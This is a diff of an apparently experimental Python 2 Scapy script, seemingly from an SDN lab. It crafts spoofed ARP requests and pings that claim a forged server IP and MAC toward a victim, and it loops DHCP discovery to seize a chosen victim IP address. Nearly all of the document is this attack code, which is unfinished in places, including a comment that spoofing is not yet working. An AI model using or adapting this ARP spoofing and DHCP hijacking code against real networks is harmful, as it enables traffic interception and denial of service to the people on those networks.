@@ -9,25 +9,38 @@ broadcastIp = '255.255.255.255'
 
 def sendPingToVic(servMac, vicMac, vicIp, servIp):
     #For flow poisoning, ping the other server?
-
+    
     pingEth = Ether(src = servMac, dst = vicMac)
     pingIp = IP(src = servIp, dst = vicIp)
     pingICMP = ICMP()
 
     fullPing = pingEth/pingIp/pingICMP
-
-    sleep(12)
-
-    pingRecv = srp1(fullPing, iface=localiface)
-    print pingRecv
+    stdPing = IP(dst=vicIp, src=servIp)/ICMP()
+    pingRecv = ''
+    count = 0
+    while (not pingRecv) and count < 3:
+        #CURRENTLY NOT SPOOFING
+        pingRecv = srp1(fullPing, iface=localiface, timeout=2)
+        count += 1
+        print pingRecv
+        print localiface
 
 def sendArpToVic(servMac, vicMac, vicIp, servIp):
     arpEth = Ether(src = servMac, dst = broadcastMac)
-    arp = ARP(op = 1, pdst = vicIp, psrc = servIp)
+    arp = ARP(op = 1, pdst = vicIp, psrc = servIp, hwsrc = servMac)
     fullArp = arpEth/arp
-    arpRecv = srp1(fullArp, iface=localiface)
+    srp1(fullArp, iface=localiface, timeout=2)
 
 #Need to use local MAC so can get response? 
+
+def arpDHCP(servIp):
+    arpEth = Ether(dst = broadcastMac)
+    
+    arp = ARP(op = 1, pdst = servIp)
+    fullArp = arpEth/arp
+    recvPk = srp1(fullArp)
+    return recvPk[Ether].src
+
 def getDHCP(localMac, ipToTake, vicMac):
 
     newIp = ''
@@ -35,8 +48,8 @@ def getDHCP(localMac, ipToTake, vicMac):
     fakeMac = ''
     fakeRaw = ''
     curXid = 0
-    servIp = ''
-    servMac = ''
+    servIp = '11.22.33.44'
+    servMac = '00:11:22:33:44:55'
     
     while newIp != ipToTake:
         count += 1
@@ -62,11 +75,14 @@ def getDHCP(localMac, ipToTake, vicMac):
         #get info
         #Current Trouble: Seem that l2_learning_switch is a per flow basis,
         #so may need to actually send ARPs instead of pings?
-        return (0,0,0,0,0,0)
-        sendPingToVic(servMac, vicMac, ipToTake, servIp)
-        sendArpToVic(servMac, vicMac, ipToTake, servIp)
-
-        recvPk = srp1(discovery,iface=localiface)
+        #if servMac != '00:11:22:33:44:55':
+        #    servMac = arpDHCP(servIp)
+        #    sleep(12)
+ #       sendPingToVic(servMac, vicMac, ipToTake, servIp)
+        sendArpToVic('00:11:22:33:44:55', vicMac, ipToTake, servIp)
+        recvPk = srp1(discovery,iface=localiface, timeout=5)
+        if not recvPk:
+            return (0,0,0,0,0)
 
         newIp = recvPk[BOOTP].yiaddr
         print newIp
@@ -101,7 +117,7 @@ def main():
     fakeMac, servIp, fakeRaw, curXid, newIp = getDHCP(localMac, ipToTake, vicMac)
     print newIp
     print fakeMac
-    
+    return
 
 #Request for the DHCP addr; currently blocking when testing with udhcpd
 #ethPk = Ether(src=fakeMac, dst = 'ff:ff:ff:ff:ff:ff')
@@ -119,5 +135,6 @@ def main():
 #print fakeMac
 
 
-if __name__ == "__main_":
+if __name__ == "__main__":
     main()
+
